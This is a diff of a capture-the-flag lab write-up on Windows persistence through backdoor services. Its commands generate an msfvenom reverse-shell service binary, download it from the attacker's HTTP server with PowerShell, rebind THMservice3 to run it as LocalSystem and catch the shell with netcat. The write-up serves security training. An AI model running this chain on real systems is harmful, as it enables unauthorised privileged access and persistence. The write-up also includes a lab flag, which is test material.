@@ -7,7 +7,7 @@ This writeup was last updated: 07/05/2023
 
 # Creating Backdoor Services
 1. Started this room's machine
-2. `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<MACHINE IP> LPORT=<PORT NUMBER> -f exe-service -o <PAYLOAD NAME1>.exe` from our Linux attack machine to use Metasplout's **msfvenom** to generate a Windows executable for a reverse shell payload that we'll execute on the compromised Windows machine
+2. `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<MACHINE IP> LPORT=<PORT NUMBER> -f exe-service -o rev-svc.exe` from our Linux attack machine to use Metasplout's **msfvenom** to generate a Windows executable for a reverse shell payload that we'll execute on the compromised Windows machine
 ```Bash
 root@ip-10-10-44-151:~# msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.44.151 LPORT=9999 -f exe-service -o rev-svc.exe
 [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
@@ -105,8 +105,8 @@ THM{SUSPICIOUS_SERVICES}
 
 # Modifying Existing Services
 1. Started this room's machine
-2. `sc.exe query state=all` from the compromised Windows machine to
-3. `sc.exe qc <SERVICE NAME>` from the compromised Windows machine to
+2. `sc.exe query state=all` from the compromised Windows machine to retrieve information about all the services that's on the compromised system and display the retrieved information onto our terminal, which ended displaying a long list of services but the one we'll be focusing on in this task is the **THMservice3** service
+3. `sc.exe qc <SERVICE NAME>` from the compromised Windows machine to retrieve and display onto our terminal the configuration and settings of our target service (THMuser3) 
 ```PowerShell
 C:\Users\Administrator>sc.exe qc THMService3
 [SC] QueryServiceConfig SUCCESS
@@ -122,7 +122,7 @@ SERVICE_NAME: THMService3
         DEPENDENCIES       :
         SERVICE_START_NAME : NT AUTHORITY\Local Service
 ```
-4. `msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=5558 -f exe-service -o rev-svc.exe` from our Linux attack machine to 
+4. `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<MACHINE IP> LPORT=<PORT NUMBER> -f exe-service -o rev-svc.exe` from our Linux attack machine to use Metasplout's **msfvenom** to generate a Windows executable for a reverse shell payload that we'll execute on the compromised Windows machine
 ```Bash
 root@ip-10-10-44-151:~# msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.44.151 LPORT=9999 -f exe-service -o rev-svc.exe
 [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
@@ -132,16 +132,16 @@ Payload size: 460 bytes
 Final size of exe-service file: 48640 bytes
 Saved as: rev-svc.exe
 ```
-5. `sudo python3 -m http.server` from our Linux attack machine to
+5. `sudo python3 -m http.server` from our Linux attack machine to start and transform our attack machine into a simple HTTP server that we'll connect to from our compromised machine to downlaod our payload
 ```Bash
 root@ip-10-10-44-151:~# sudo python3 -m http.server
 Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
 ```
-6. `PowerShell "(New-Object System.Net.WebClient).Downloadfile('http://<MACHINE IP>:8000/<PAYLOAD NAME1>.exe','<PAYLOAD NAME2>.exe')"` from the compromised Windows machine to
+6. `PowerShell "(New-Object System.Net.WebClient).Downloadfile('http://<MACHINE IP>:8000/<PAYLOAD NAME1>.exe','rev-svc.exe')"` from our compromised Windows machine to create a new instance of the **System.Net.Web** class, which allowed us to call its **DownloadFile** method, which then allowed us to download our payload from our attack machine which we temporarily turned into an HTTP server by specifying its location and the name we want to give that payload when we download it onto the compromised machine
 ```PowerShell
 PS C:\Users\Administrator> PowerShell "(New-Object System.Net.WebClient).Downloadfile('http://10.10.44.151:8000/rev-svc.exe','Payload.exe')"
 ```
-7. `dir` from the compromised Windows machine to
+7. `dir` from our compromised Windows machine to display the files and directories that are in our current working directory onto our terminal to verify that we successfully downloaded our payload from our attack machine, which we did
 ```PowerShell
 PS C:\Users\Administrator> dir
 
@@ -166,12 +166,12 @@ d-r---        3/17/2021   3:13 PM                Videos
 -a----         7/6/2023   1:24 AM          48640 Payload.exe
 ```
 
-8. `sc.exe config <SERVICE NAME> binPath= "<MSFVENOM PAYLOAD PATH>" start= auto obj= "LocalSystem"` from the compromised Windows machine to
+8. `sc.exe config <SERVICE NAME> binPath= "<MSFVENOM PAYLOAD PATH>" start= auto obj= "LocalSystem"` from the compromised Windows machine to modify the configuration settings of our target service (THMservice3) by replacing the BINARY_PATH_NAME with our paylaod's file path and its SERVICE_START_NAME to "LocalSystem", which specifies that this service will now run under the Local System account, which is a highly privileged built-in account in Windows
 ```PowerShell
 PS C:\Users\Administrator> sc.exe config THMservice3 binPath= "C:\Users\Administrator\Payload.exe" start= auto obj= "LocalSystem"
 [SC] ChangeServiceConfig SUCCESS
 ```
-9. `sc.exe qc <SERVICE NAME>` from the compromised Windows machine to
+9. `sc.exe qc <SERVICE NAME>` from the compromised Windows machine to retrieve and display onto our terminal the configuration and settings for the service that we just modified (THMservice3) 
 ```PowerShell
 PS C:\Users\Administrator> sc.exe qc THMservice3
 [SC] QueryServiceConfig SUCCESS
@@ -187,12 +187,12 @@ SERVICE_NAME: THMservice3
         DEPENDENCIES       :
         SERVICE_START_NAME : LocalSystem
 ```
-10. `nc -lvnp <PORT NUMBER>` from our Linux attack machine
+10. `nc -lvnp <PORT NUMBER>` from our Linux attack machine to open up a netcat listener that'll listen for any inbound connection
 ```Bash
 root@ip-10-10-44-151:~# nc -lvnp 9999
 Listening on [0.0.0.0] (family 0, port 9999)
 ```
-11. `sc.exe start <SERVICE NAME>` from the compromised Windows machine to
+11. `sc.exe start <SERVICE NAME>` from our compromised Windows machine to start the service that we just modified (THMservice3), which executed our payload that resulted in a reverse shell being created which then connected back to our netcat listener that's running on our attack machine
 ```PowerShell
 PS C:\Users\Administrator> sc.exe start THMservice3
 
